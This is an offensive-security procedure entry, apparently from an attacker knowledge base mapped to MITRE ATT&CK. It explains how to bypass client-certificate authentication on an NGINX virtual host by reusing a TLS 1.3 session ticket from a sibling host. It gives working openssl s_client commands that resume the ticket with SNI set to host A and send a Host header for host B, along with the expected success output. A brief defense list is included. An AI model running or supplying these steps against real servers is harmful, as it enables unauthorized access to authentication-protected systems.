---
tags:
  - tls-resumption
  - sni-manipulation
  - session-ticket
type: procedure
tools:
  - '[[tools/OpenSSL]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/openssl-s-client-session-resume]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:31:31.106Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 9f1a501e-9213-4abf-9cbe-b7f555d5f655
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Resume TLS Session on Virtual Host B Using Ticket from A

## Summary

This procedure resumes a TLS session ticket obtained from an authenticated connection to host A on the second virtual host B, bypassing client certificate re-authentication by manipulating SNI and HTTP Host headers.

## Description

Due to NGINX's failure to isolate session tickets between virtual hosts in TLS 1.3 with OpenSSL, a ticket from host A can be used on host B. Set SNI to host A (or omit) while using the HTTP Host header for B, allowing resumption without credentials. This exploits shared key material and lack of per-host isolation.

## Requirements

1. Session ticket or PEM file from host A handshake
2. Knowledge of shared IP/port and hostnames (A and B)
3. OpenSSL for TLS resumption

## Defense

Defensive measures and detection strategies:

- Configure separate SSL contexts or session caches per virtual host
- Disable session resumption or tickets in multi-host setups
- Log and alert on SNI/Host header mismatches in TLS sessions

## Objectives

1. Initiate TLS resumption with ticket from A
2. Target host B via HTTP headers
3. Confirm bypass of auth on B

## Instructions

### Step 1: Initiate Session Resumption

**Context**: Connect to the shared IP with SNI set to host A, using the session ticket from A.

**Command** ([[commands/openssl-s-client-session-resume]]):
```bash
openssl s_client -connect shared-ip.example.com:443 -tls1_3 -servername hostA.example.com -sess_in session_A.pem -sess_out resumed_B.pem
```

> This resumes the session without client cert. Expected output shows abbreviated handshake and "Reused, TLSv1.3, Cipher..."

### Step 2: Send HTTP Request Targeting Host B

**Context**: Over the resumed connection, specify host B in the HTTP Host header to access its resources.

**Command** ([[commands/openssl-http-request-over-tls]]):
```bash
printf "GET / HTTP/1.1\r\nHost: hostB.example.com\r\n\r\n" | openssl s_client -connect shared-ip.example.com:443 -tls1_3 -servername hostA.example.com -sess_in session_A.pem
```

> Routes the request to host B via NGINX routing. Successful output includes HTTP 200 from B without auth prompt.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques


## Commands Used

- [[commands/openssl-s-client-session-resume]]
- [[commands/openssl-http-request-over-tls]]

## Tools Used

- [[tools/OpenSSL]]

## Tags

- [[tls-resumption]]
- [[auth-bypass]]
- [[nginx]]
